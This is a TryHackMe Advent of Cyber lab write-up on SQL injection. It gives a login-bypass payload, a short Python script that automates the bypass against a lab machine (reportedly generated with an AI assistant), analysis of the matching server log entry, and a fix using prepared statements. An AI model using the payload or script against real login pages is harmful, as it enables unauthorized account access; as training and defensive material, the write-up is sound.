# 🎄 Advent of Cyber 2025 - Day 4: AI in Cybersecurity

**Category:** Red Teaming / Blue Teaming / Secure Coding
**Platform:** TryHackMe
**Tools Used:** AI Assistant (Van SolveIT), Python, Log Analysis
**Topic:** Automating Exploitation & Remediation of SQL Injection

## 1. Executive Summary

This engagement explored the role of Artificial Intelligence in the cybersecurity lifecycle. Acting as a Red Teamer, Blue Teamer, and Software Developer, I utilized an AI assistant to identify, exploit, detect, and remediate a critical **SQL Injection (SQLi)** vulnerability in a web application's login portal.

The assessment demonstrated how AI can accelerate offensive scripting, simplify forensic log analysis, and provide secure coding recommendations.

---

## 2. Phase 1: Red Team (Automated Exploitation)

### 2.1 Vulnerability Discovery
The target application contained a logic flaw in the authentication mechanism. By injecting a specific SQL payload, it was possible to alter the database query logic to bypass the password check.

**The Payload:**
```sql
alice' OR 1=1 -- -
Analysis: The ' closes the username field string. OR 1=1 creates a "True" condition (Tautology), forcing the database to return the first record (Administrator). The -- - comments out the rest of the query, effectively removing the password requirement.

2.2 AI-Assisted Automation

Instead of manual entry, I leveraged the AI assistant to generate a Python script to automate this attack. This demonstrates how attackers use AI to weaponize vulnerabilities quickly.

Exploit Script (Python):
import requests

url = "http://MACHINE_IP:5000/login.php"
# The payload forces a login bypass
payload = {
    "username": "alice' OR 1=1 -- -",
    "password": "anything" 
}

response = requests.post(url, data=payload)

if "Welcome" in response.text:
    print("[+] Login Successful! Admin access granted.")
else:
    print("[-] Exploit failed.")
Result: The script successfully retrieved the Admin Flag, confirming the vulnerability.

3. Phase 2: Blue Team (Log Analysis)

After the attack, I switched roles to investigate the server logs (Digital Forensics). The goal was to identify the traces left by the automated exploit.

Log Entry Found:
Snippet di codice

198.51.100.22 - - [03/Oct/2025:09:03:11] "POST /login.php HTTP/1.1" 200 642 "-" "python-requests/2.31.0" "username=alice%27+OR+1%3D1+--+-&password=test"

3.1 Indicators of Compromise (IoCs)

The AI assistant helped decode and interpret the raw log data:

    Status Code 200 (OK): The server accepted the request. A failed login usually returns 401 or 403. A 200 status on a login endpoint with strange payloads is a strong indicator of a successful breach.

    User-Agent (python-requests): The attacker did not spoof the User-Agent. This explicitly identifies the traffic as coming from a Python script, not a human browser.

    URL Encoded Payload: The log shows %27 (single quote) and OR+1%3D1 (OR 1=1), which are clear signatures of a SQL Injection attempt.

4. Phase 3: Software Security (Remediation)

The final phase involved analyzing the source code to fix the root cause.

Vulnerable Code (PHP):
PHP

$user = $_POST['username'] ?? '';
$pass = $_POST['password'] ?? '';
// Implicit Vulnerability: These variables are passed directly to SQL
The vulnerability exists because the application accepts raw user input ($_POST) and concatenates it directly into the database command without sanitization.
4.2 The Fix: Prepared Statements

To patch this, the code must be refactored to use Prepared Statements. This ensures the database treats user input strictly as data, never as executable code.

Secure Implementation:
PHP

// Using PDO Prepared Statements
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = :username');
$stmt->execute(['username' => $user]);
$result = $stmt->fetch();
5. Key Takeaways

    Lifecycle of a Vulnerability: This exercise covered the complete path: Exploitation -> Detection -> Remediation.

    AI Utility: AI proved effective in generating attack scripts (Red Team) and explaining complex log entries (Blue Team).

    Defense in Depth: The most effective defense is secure coding (Prepared Statements), supported by monitoring logs for anomalous User-Agents and status codes.

Author: [Ramotech]
